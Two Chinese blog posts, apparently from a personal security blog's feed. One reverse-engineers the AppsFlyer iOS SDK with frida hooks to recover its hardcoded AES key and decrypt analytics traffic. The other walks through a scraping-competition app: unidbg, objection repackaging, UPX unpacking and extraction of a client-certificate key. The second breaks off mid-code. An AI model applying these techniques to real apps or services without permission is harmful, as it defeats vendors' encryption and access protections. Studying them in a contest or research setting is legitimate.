        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前段时间有这样一个需求，需要抓一下IOS端下appsflyer这个平台的数据，于是就帮忙看了一下。这里其实和APP没多大关系，需要接入appsflyer这个平台的APP就可以，然后将抓包获取的加密数据进行解密。</p><a id="more"></a><h2 id="0x01-准备"><a href="#0x01-准备" class="headerlink" title="0x01 准备"></a>0x01 准备</h2><p>给我的并不是一个ipa文件，而是一个压缩包文件。</p><p><img src="1665475953282.png" alt="img"></p><p>Payload.zip其实就是ipa文件进行解压后再压缩而来的，但是修改文件名直接安装是不行的，需要重新签名。</p><p>这里将文件重命名为1.ipa，不进行签名，然后使用命令<code>ideviceinstaller -i 1.ipa</code>进行安装，结果安装失败。</p><p><img src="1665476387171.png" alt="image.png"></p><blockquote><p>可以使用命令安装，也可以借助其他工具安装，如Xcode、爱思助手等。</p></blockquote><p>签名的话也有多种方法，我这里使用<code>IOS App Signer</code>进行签名。<br><img src="1665453441068.png" alt><br>签名后重新安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ideviceinstaller -i 1-sign.ipa</span><br></pre></td></tr></table></figure><p><img src="1665476872147.png" alt="image.png"><br>签名后安装成功，对比源文件与签名后文件的签名。<br><img src="1665477694718.png" alt="image.png"><br>接下来就是进行抓包分析了。</p><h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h2><p>运行app并抓包，会发现有很多请求，但每次打开APP与appsflyer有关的请求一般有三个，可以直接过滤出来。<br><img src="1664700263947.png" alt><br>可以看到请求的内容是乱码，应该是采用了某种加密。接下来使用ida对文件进行分析。<br>一般都是进行关键字的搜索，然后慢慢定位找到加密相关的函数，例如这里搜索的关键字是<code>iosevent</code>。<br><img src="1665478042545.png" alt="image.png"><br>对比一下请求的URL，可能是第一个。<br>一直查找引用，直到发现<code>-[AppsFlyerLib __validateAndLogInAppPurchase:price:currency:transactionId:additionalParameters:success:failure:]</code>进行了调用。<br><img src="1665479059395.png" alt="image.png"></p><p>使用<code>frida-trace</code>进行追踪<br><code>frida-trace -U -f cn.fuping.hhrx -m &quot;-[AppsFlyerLib __validateAndLogInAppPurchase:price:currency:transactionId:additionalParameters:success:failure:]&quot;</code>。<br><img src="1665479210801.png" alt="image.png"><br>这里仍有三个appsflyer相关的请求，但是发现并没有对该方法进行调用，因此可能是找错了。</p><p>通过查看请求，可以看到<code>Content-Type</code>是<code>application/octet-stream</code>，所以也可去搜索<code>application/octet-stream</code>。<br><img src="1665479524193.png" alt="image.png"><br>搜索<code>application/octet-stream</code>。</p><p><img src="1665479555145.png" alt="image.png"><br>一直查找引用，最终定位在<code>-[AppsFlyerHTTPClient sendEvent:completionHandler:]</code>方法中。</p><p><img src="1665543559382.png" alt="image.png"><br>在其中也可以看到调用了与加密相关的内容<code>-[AFSDKEvent encryptWithData:]</code>。<br>使用<code>frida-trace</code>进行追踪<br>关键代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  onEnter(log, args, state) &#123;</span><br><span class="line">    <span class="keyword">var</span> arg2ObjC = ObjC.Object(args[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">var</span> arg2 = Memory.readUtf8String(arg2ObjC.bytes(), arg2ObjC.length());</span><br><span class="line">    log(<span class="string">`-[AFSDKEvent encryptWithData:<span class="subst">$&#123;arg2&#125;</span>]`</span>);</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  onLeave(log, retval, state) &#123;</span><br><span class="line">    log(<span class="string">`-[AFSDKEvent encryptWithData:-&gt;result-&gt;<span class="subst">$&#123;ObjC.<span class="built_in">Object</span>(retval)&#125;</span>]`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以成功获取加密前的数据<br><img src="1665562522159.png" alt="image.png"><br>加密后的结果也是一致的。接下来就是看加密是如何实现的，另外能否进行解密。<br><img src="1665562646545.png" alt="image.png"><br>进入到<code>-[AFSDKEvent encryptWithData:]</code>方法，看是如何进行加密的。<br><img src="1665562914366.png" alt="image.png"><br>通过分析发现其调用了<code>-[AFSDKEvent key]</code>获取key，这里key是固定的，为<code>X3sgfYhYXWhDoD8DhW2aaJ</code>。然后调用<code>+[AppsFlyerAES128Crypto encrypt:withObject:]</code>进行加密。继续跟进加密的方法。<br><img src="1665563333248.png" alt="image.png"></p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CCCrypt(<span class="number">0</span>LL, <span class="number">0</span>LL, <span class="number">1</span>LL, v19, v20, v22, v24, v25, v27, v28, &amp;v35)</span><br></pre></td></tr></table></figure><p>这里看到了<code>CCCrypt</code>函数的调用，可以先了解一下该函数，然后分析加密流程。<br>使用<code>CCCrypt</code>进行加密时，需要引入<code>CommonCrypto/CommonCryptor.h</code>框架。<br>其中<code>CCCrypt</code>函数定义：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">CCCryptorStatus CCCrypt(</span><br><span class="line">    CCOperation op,         <span class="comment">/* kCCEncrypt, etc. */</span></span><br><span class="line">    CCAlgorithm alg,        <span class="comment">/* kCCAlgorithmAES128, etc. */</span></span><br><span class="line">    CCOptions options,      <span class="comment">/* kCCOptionPKCS7Padding, etc. */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">void</span> *key,</span><br><span class="line">    size_t keyLength,</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">void</span> *iv,         <span class="comment">/* optional initialization vector */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">void</span> *dataIn,     <span class="comment">/* optional per op and alg */</span></span><br><span class="line">    size_t dataInLength,</span><br><span class="line">    <span class="keyword">void</span> *dataOut,          <span class="comment">/* data RETURNED here */</span></span><br><span class="line">    size_t dataOutAvailable,</span><br><span class="line">    size_t *dataOutMoved)</span><br></pre></td></tr></table></figure><p>一共有11个参数，参数简要说明如下：</p><table><thead><tr><th>参数</th><th>说明</th><th>备注</th></tr></thead><tbody><tr><td>CCOperation op</td><td>加密(kCCEncrypt=0)</td><td></td></tr><tr><td>解密(kCCDecrypt=1)</td><td>这里是加密</td><td></td></tr><tr><td>CCAlgorithm alg</td><td>加解密算法标准</td><td></td></tr><tr><td>kCCAlgorithmAES128=0,</td><td></td><td></td></tr><tr><td>kCCAlgorithmAES=0</td><td>这里为kCCAlgorithmAES128或者kCCAlgorithmAES加密</td><td></td></tr><tr><td>CCOptions options</td><td>加密方式的选项</td><td></td></tr><tr><td>kCCOptionPKCS7Padding表示CBC</td><td></td><td></td></tr><tr><td>kCCOptionECBMode表示ECB</td><td></td><td></td></tr><tr><td>kCCOptionPKCS7Padding&#124;kCCOptionECBMode表示ECB且PKCS7Padding填充</td><td>这里为CBC加密，且用PKCS7Padding进行填充</td><td></td></tr><tr><td>const void *key</td><td>加密密钥</td><td>固定值</td></tr><tr><td>size_t keyLength</td><td>密钥长度</td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td>const void *iv</td><td>iv 初始化向量，ECB 不需要指定</td><td>随机值</td></tr><tr><td>const void *dataIn</td><td>加密的数据</td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td>size_t dataInLength</td><td>加密的数据长度</td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td>void *dataOut</td><td>缓冲区（地址），存放密文的</td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td>size_t dataOutAvailable</td><td>缓冲区的大小</td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td>size_t *dataOutMoved</td><td>加密结果大小</td><td></td></tr><tr><td></td><td></td><td></td></tr></tbody></table><p>然后转过头来分析加密的流程。首先调用了<code>+[AppsFlyerAES128Crypto randomDataOfLength:]</code>生成了一个16byte的随机字符作为iv。<br>接着调用<code>+[AppsFlyerAES128Crypto AESKeyForPassword:salt:]</code>对key进行解密，解密后的的结果作为加密的key值，为<code>84adf6ec41acb6cbeb349d0a7078f0d2</code>。<br>最后调用CCCrypt进行加密，加密方法是AES-CBC。<br><img src="1665564158204.png" alt="image.png"><br>加密完成后将IV和8位00与加密数据进行拼接。所以可以直接根据请求的数据进行解密。<br><img src="1665583353853.png" alt="image.png"><br>例如上面的请求包共分为三部分，第一部分为加密后的内容，第二部分为IV，长度为16，这里是<code>b820980ed08844945179a96721bbbcd3</code>，第三部分为0，长度为8。<br>然后进行解密：<br><img src="1665583487412.png" alt="image.png"><br>成功解密数据，到这里任务就完成了。<br>其实在搜索的时候也可以搜索其他关键字，例如<code>buildnumber</code>。<br><img src="1665479366366.png" alt="image.png"><br>被圈中的两个字符串与URL进行对比，相似度很高。可以进一步去分析查找引用进行分析。<br>另外这里的加密用到了<code>CCCrypt</code>函数，所以也可以直接对其进行追踪，例如</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-trace -U -f xxxx -i CCCrypt</span><br></pre></td></tr></table></figure><p>然后修改<code>libcommonCrypto.dylib</code>下的<code>CCCrypt.js</code>文件，主要代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  onEnter: <span class="function"><span class="keyword">function</span> (<span class="params">log, args, state</span>) </span>&#123;</span><br><span class="line">    log(<span class="string">'CCCrypt('</span> +</span><br><span class="line">        <span class="string">'op='</span> + args[<span class="number">0</span>] +</span><br><span class="line">        <span class="string">', alg='</span> + args[<span class="number">1</span>] +</span><br><span class="line">        <span class="string">', options='</span> + args[<span class="number">2</span>] +</span><br><span class="line">        <span class="string">', key='</span> + args[<span class="number">3</span>] +</span><br><span class="line">        <span class="string">', keyLength='</span> + args[<span class="number">4</span>] +</span><br><span class="line">        <span class="string">', iv='</span> + args[<span class="number">5</span>] +</span><br><span class="line">        <span class="string">', dataIn='</span> + args[<span class="number">6</span>] +</span><br><span class="line">        <span class="string">', dataInLength='</span> + args[<span class="number">7</span>] +</span><br><span class="line">        <span class="string">', dataOut='</span> + args[<span class="number">8</span>] +</span><br><span class="line">        <span class="string">', dataOutAvailable='</span> + args[<span class="number">9</span>] +</span><br><span class="line">        <span class="string">', dataOutMoved='</span> + args[<span class="number">10</span>] +</span><br><span class="line">        <span class="string">')'</span>);</span><br><span class="line">    <span class="comment">//保存参数</span></span><br><span class="line">    <span class="keyword">this</span>.operation   = args[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">this</span>.CCAlgorithm = args[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">this</span>.CCOptions   = args[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">this</span>.keyBytes    = args[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">this</span>.keyLength   = args[<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">this</span>.ivBuffer    = args[<span class="number">5</span>]</span><br><span class="line">    <span class="keyword">this</span>.inBuffer    = args[<span class="number">6</span>]</span><br><span class="line">    <span class="keyword">this</span>.inLength    = args[<span class="number">7</span>]</span><br><span class="line">    <span class="keyword">this</span>.outBuffer   = args[<span class="number">8</span>]</span><br><span class="line">    <span class="keyword">this</span>.outLength   = args[<span class="number">9</span>]</span><br><span class="line">    <span class="keyword">this</span>.outCountPtr = args[<span class="number">10</span>]</span><br><span class="line">    <span class="comment">//this.operation == 0 代表是加密</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.operation == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="comment">//打印加密前的原文</span></span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">"In buffer:"</span>)</span><br><span class="line">      <span class="built_in">console</span>.log(hexdump(ptr(<span class="keyword">this</span>.inBuffer), &#123;</span><br><span class="line">        length: <span class="keyword">this</span>.inLength.toInt32(),</span><br><span class="line">        header: <span class="literal">true</span>,</span><br><span class="line">        ansi: <span class="literal">true</span></span><br><span class="line">      &#125;))</span><br><span class="line">      <span class="comment">//打印密钥</span></span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">"Key: "</span>)</span><br><span class="line">      <span class="built_in">console</span>.log(hexdump(ptr(<span class="keyword">this</span>.keyBytes), &#123;</span><br><span class="line">        length: <span class="keyword">this</span>.keyLength.toInt32(),</span><br><span class="line">        header: <span class="literal">true</span>,</span><br><span class="line">        ansi: <span class="literal">true</span></span><br><span class="line">      &#125;))</span><br><span class="line">      <span class="comment">//打印 IV</span></span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">"IV: "</span>)</span><br><span class="line">      <span class="built_in">console</span>.log(hexdump(ptr(<span class="keyword">this</span>.ivBuffer), &#123;</span><br><span class="line">        length: <span class="keyword">this</span>.keyLength.toInt32(),</span><br><span class="line">        header: <span class="literal">true</span>,</span><br><span class="line">        ansi: <span class="literal">true</span></span><br><span class="line">      &#125;))</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  onLeave: <span class="function"><span class="keyword">function</span> (<span class="params">log, retval, state</span>) </span>&#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如下：<br><img src="1665587977491.png" alt="image.png"><br>也是可以进行加密数据的解析。</p><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>本文主要涉及部分内容，一是ios APP签名，另外就是加密函数<code>CCCrypt</code>。该函数是IOS加密中常用的函数，在分析的时候可以直接使用<code>frida-trace -U -f xxxx -i CCCrypt</code>来查看加密是否调用了该函数，然后进行数据解密。</p>]]></content>
      
      
      <categories>
          
          <category> IOS逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> frida </tag>
            
            <tag> appsflyer </tag>
            
            <tag> CCCrypt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次APP爬虫比赛</title>
      <link href="/2022/07/07/YRX-APP-MATCH/"/>
      <url>/2022/07/07/YRX-APP-MATCH/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>5月中旬的时候，猿人学举行了一个APP爬虫大赛，共设10题，主要涉及Android反混淆，双向认证，tls指纹对抗等技术。而且只需要答对一题就有参与奖，即可获得一件猿人学定制T恤。另外第一题不涉及so，仅涉及java层加密。为了T恤，立马去报了名参赛。</p><a id="more"></a><h2 id="0x02答题"><a href="#0x02答题" class="headerlink" title="0x02答题"></a>0x02答题</h2><p>比赛开始的时候，想着下载完APP，然后冲完第一题就完事，但结果发现APP安装都成问题。<br><img src="YRX-01.png" alt="YRX-01.png"></p><p>查看规则才知道，参赛的APP只支持arm64架构的手机，我的<code>Nexus 5</code>根本不支持。还好身边有一个marry大佬尊贵的荣耀8，成功安装了APP。<br><img src="YRX-02.png" alt="YRX-02.png"><br>但是又出现了另外的问题，由于手机是安卓版本8.0，也没有root，配置完代理无法抓到该程序的包。对于未root抓包的话，也有很多其他的解决方法，例如可以使用<code>VMOS Pro</code>，也可以使用<code>VirtualXposed</code>结合xposed插件来抓包，或者利用<code>objection</code>重新打包，之后就可以使用<code>objection</code>来进行测试。<br>实际上不用抓包也是可以做出几道题的，需要搞清楚请求的参数即可，首先来看第一题。</p><h3 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h3><p>虽说第一题不涉及so，仅包含java层的加密，但这道题做起来也有一点麻烦，需要抠代码和修改。首先来看一下题目：<br><img src="YRX-03.png" alt="YRX-03.png"><br>10道题都是要爬取1-100页之间的数据，然后求和。<br>由于APP没有加壳，所以可以直接使用jadx来打开，可以看到代码进行了混淆。</p><blockquote><p>使用<code>adb shell dumpsys activity top</code>来找到当前打开的界面，从而定位到<code>com.yuanrenxue.match2022.fragment.challenge.ChallengeOneFragment</code></p></blockquote><p>进入到<code>com.yuanrenxue.match2022.fragment.challenge.ChallengeOneFragment</code>中。</p><p><img src="YRX-04.png" alt="YRX-04.png"><br>可以很容易就发现加密的关键点，调用了<code>com.yuanrenxue.match2022.security.Sign</code>的sign方法对一些参数进行了加密。这里sign方法传入的参数是<code>sb.toString().getBytes(StandardCharsets.UTF_8)</code>，而<code>sb</code>可以从上面获取。主要代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">StringBuilder sb = <span class="keyword">new</span> StringBuilder();  </span><br><span class="line">       sb.append(<span class="string">"page="</span>);  </span><br><span class="line">       sb.append(<span class="keyword">this</span>.page);  </span><br><span class="line">       <span class="keyword">long</span> longValue = c3756OooOO0O.OooO00o().longValue();  </span><br><span class="line">       sb.append(longValue);</span><br></pre></td></tr></table></figure><p>由代码可以看出，<code>sb.toString()</code>的内容就是<code>page=</code>拼接当前页码，和当前时间戳组成的。<br><img src="YRX-05.png" alt="YRX-05.png"><br>进入到<code>o0O0ooO.AbstractC4864OooO0O0</code>的<code>OooO00o</code>方法。<br><img src="YRX-06.png" alt="YRX-06.png"><br>可以发现http请求的接口和参数，经过拼接后请求的url是<code>https://appmatch.yuanrenxue.com/app1</code>，参数一共有3个。分别为当前页码<code>page</code>、加密结果<code>sign</code>以及时间戳<code>t</code>，重点看一下如何加密获取sign值的。</p><blockquote><p>使用抓包的话很容易就定位到这里，当时没有抓包，经过尝试也是可以获取到请求的URL。</p></blockquote><p>进入<code>com.yuanrenxue.match2022.security.Sign.sign</code>方法，这里推荐用idea打开，可以少走一些弯路。可以对比看一下jadx和idea打开的效果，这里就不放图了。下面是使用idea打开的效果：<br><img src="YRX-07.png" alt="YRX-07.png"><br>从群里发现有老师傅发出抓包请求的内容，刚好可以供我们进行测试。请求的内容:<code>page=1&amp;sign=837056ab8650736b103f193d95ebbc3c&amp;t=1652444336</code>，看起来sign像是md5，经验证发现并不是。如果直接调用反编译后的<code>new com.yuanrenxue.match2022.security.Sign().sign()</code>方法，结果也是不正确的。<br><img src="YRX-08.png" alt="YRX-08.png"><br>主要原因可能是因为这些内容是反编译过来的，有些内容可能有所变动。这里的思路是把用到的方法拎出来，然后进行修改。扒完之后一共有这几个文件：<br><img src="YRX-09.png" alt="YRX-09.png"><br>当然运行结果也不是正确的。经过对比，用idea和jadx打开的<code>f</code>方法内容是不一样的：<br><img src="YRX-10.png" alt="YRX-10.png"><br>将内容修改后，可以成功获取到正确的sign值。<br><img src="YRX-11.png" alt="YRX-11.png"></p><p>剩下的就简单了，请求1-100页，获取到每页的数据然后求和。这里仅演示获取第一页的数值。<br><img src="YRX-12.png" alt="YRX-12.png"></p><p>做完了第一题后又看了一下其他的题，发现第二题、第三题、第八题通过使用<code>unidbg</code>可以很直接的得出结果，第五题采用了双向证书，直接抠代码也是可以做出来。第二题、第三题、第八题做题思路一样，所以放一起来说，最后再说第五题。</p><h3 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h3><p>第二题就涉及到了so，这不禁令人头大。搞了好久so文件才发现规则中允许使用<code>unidbg</code>，用其调用so的话简单快捷。这里没有好兄弟发请求的数据了，只能自己动手抓包了。<br>由于要对app进行抓包和hook查看参数，因此<code>objection</code>将<code>frida-gadget.so</code>打包进apk中，使用命令为：<br><code>objection patchapk --source yuanrenxuem106.apk</code>。<br>然后就可以利用    <code>objection</code>对app进行分析了。<br><img src="YRX-13.png" alt="YRX-13.png"><br>通过查看反编译后的代码，第二题的话请求一共有3个参数:<code>page</code>、<code>ts</code>、<code>sign</code>，<code>page</code>是页码，<code>ts</code>是时间戳，<code>sign</code>是加密的内容。<br><img src="YRX-14.png" alt="YRX-14.png"><br>可以看到sign是经过了调用so的加密结果，使用<code>objection</code>查看加密传入的参数。<br><code>android hooking watch class_method com.yuanrenxue.match2022.fragment.challenge.ChallengeTwoFragment.sign --dump-args</code><br><img src="YRX-15.png" alt="YRX-15.png"><br>传入的参数是由<code>page</code>和<code>ts</code>进行了拼接，中间由<code>:</code>连接。知道了调用so的传入的参数，下面就开始用unidbg进行调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChallengeTwoFragment</span> <span class="keyword">extends</span> <span class="title">AbstractJni</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> AndroidEmulator emulator;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> VM vm;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Memory memory;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Module <span class="keyword">module</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ChallengeTwoFragment</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">        emulator = AndroidEmulatorBuilder  </span><br><span class="line">                .for64Bit()  </span><br><span class="line">                .addBackendFactory(<span class="keyword">new</span> DynarmicFactory(<span class="keyword">true</span>))  </span><br><span class="line">                .build();  </span><br><span class="line">        memory = emulator.getMemory();  </span><br><span class="line">        memory.setLibraryResolver(<span class="keyword">new</span> AndroidResolver(<span class="number">23</span>));  </span><br><span class="line">        vm = emulator.createDalvikVM(<span class="keyword">new</span> File(<span class="string">"file/app/yuanrenxuem106.apk"</span>));  </span><br><span class="line">        vm.setDvmClassFactory(<span class="keyword">new</span> ProxyClassFactory());  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 加载so到虚拟内存  </span></span><br><span class="line">        DalvikModule dm = vm.loadLibrary(<span class="string">"match02"</span>, <span class="keyword">true</span>);  </span><br><span class="line">        <span class="keyword">module</span> = dm.getModule();  </span><br><span class="line">        vm.callJNI_OnLoad(emulator, <span class="keyword">module</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">callSign</span><span class="params">(String data)</span> </span>&#123;<span class="comment">//通过符号  </span></span><br><span class="line">        DvmObject&lt;?&gt; object = ProxyDvmObject.createObject(vm, <span class="keyword">this</span>);  </span><br><span class="line">        DvmObject&lt;?&gt; dvmObject = object.callJniMethodObject(emulator, <span class="string">"sign(java/lang/String;)java/lang/String;"</span>, data);  </span><br><span class="line">        String result = (String) dvmObject.getValue();  </span><br><span class="line">        <span class="keyword">return</span> result;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>unidbg调用so很简单，直接根据demo修改一下就行，需要注意的是要启动64位的模拟器。获取第一页的数据：<br><img src="YRX-16.png" alt="YRX-16.png"></p><h3 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h3><p>第三题的话和第二题类似，so文件虽然进行了加密混淆，但是可以直接使用unidbg来调用so文件。<br>首先找到第三题的请求参数，一共两个参数<code>page</code>和<code>m</code>。<br><img src="YRX-17.png" alt="YRX-17.png"><br>参数<code>m</code>的值是通过<code>crypto</code>来进行加密的，一共两个参数，类型分别为<code>String</code>和<code>long</code>。<br><img src="YRX-18.png" alt="YRX-18.png"><br>查看一下传入的两个参数内容，使用命令：<br><code>android hooking watch class_method com.yuanrenxue.match2022.fragment.challenge.ChallengeThreeFragment.crypto --dump-args</code><br><img src="YRX-19.png" alt="YRX-19.png"><br>发现第一个参数是页码与时间戳乘以1000来进行拼接的，同时如果页码长度不为3时，需要前面补零，第二个参数为时间戳乘以1000。<br>第三题和第二题是同样的套路，直接修改一下就可以使用，主要代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">callCrypto</span><span class="params">(String data,<span class="keyword">long</span> l)</span> </span>&#123;<span class="comment">//通过符号  </span></span><br><span class="line">    DvmObject&lt;?&gt; object = ProxyDvmObject.createObject(vm, <span class="keyword">this</span>);  </span><br><span class="line">    DvmObject&lt;?&gt; dvmObject = object.callJniMethodObject(emulator, <span class="string">"crypto(Ljava/lang/String;J)Ljava/lang/String;"</span>, data,l);  </span><br><span class="line">    String result = (String) dvmObject.getValue();  </span><br><span class="line">    <span class="keyword">return</span> result;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取第一页的数据：<br><img src="YRX-20.png" alt="YRX-20.png"></p><h3 id="第八题"><a href="#第八题" class="headerlink" title="第八题"></a>第八题</h3><p>第八题与第二题、第三题都是类似的，只不过是so多加了一层upx壳，脱壳后可以通过unidbg来调用。<br>脱壳命令：<code>upx -d libmatch08.so</code><br><img src="YRX-21.png" alt="YRX-21.png"><br>查看第八题的参数，发现只有一个参数<code>s</code>。<br><img src="YRX-22.png" alt="YRX-22.png"><br>通过分析参数<code>s</code>是调用native层的<code>data</code>方法来进行加密的，传入的是页码。<br><img src="YRX-23.png" alt="YRX-23.png"><br>通过objection来验证一下：<br><code>android hooking watch class_method com.yuanrenxue.match2022.fragment.challenge.ChallengeEightFragment.data --dump-args --dump-return</code><br><img src="YRX-24.png" alt="YRX-24.png"><br>发现<code>data</code>方法传入的就是页码，然后使用unidbg来直接调用so文件，主要代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">callData</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;<span class="comment">//通过符号  </span></span><br><span class="line">    DvmObject&lt;?&gt; object = ProxyDvmObject.createObject(vm, <span class="keyword">this</span>);  </span><br><span class="line">    DvmObject&lt;?&gt; dvmObject = object.callJniMethodObject(emulator, <span class="string">"data(I)Ljava/lang/String;"</span>, i);  </span><br><span class="line">    String result = (String) dvmObject.getValue();  </span><br><span class="line">    <span class="keyword">return</span> result;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取第一页的数据：<br><img src="YRX-25.png" alt="YRX-25.png"></p><h3 id="第五题"><a href="#第五题" class="headerlink" title="第五题"></a>第五题</h3><p>第五题的话也不难，从网上copy一个双向证书请求的代码就可以来完成。但需要注意几点：一是请求的URL有所变化，二是要找到key，三是如果用java来写的话，要<strong>注意jdk的版本</strong>，当时就是由于jdk的版本导致当时没做出来，换了个jdk版本，立马就出来结果了。<br>首先来分析参数，可以看出来请求的路径有所变化，参数的话只有一个，就是页码<code>page</code>。<br><img src="YRX-26.png" alt="YRX-26.png"><br>通过抓包，可以看到URL也变化了：<br><img src="YRX-27.png" alt="YRX-27.png"><br>通过hook查看一下key的值：<br><code>android hooking watch class_method javax.net.ssl.KeyManagerFactory.init --dump-args</code><br><img src="YRX-28.png" alt="YRX-28.png"><br>发送请求的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 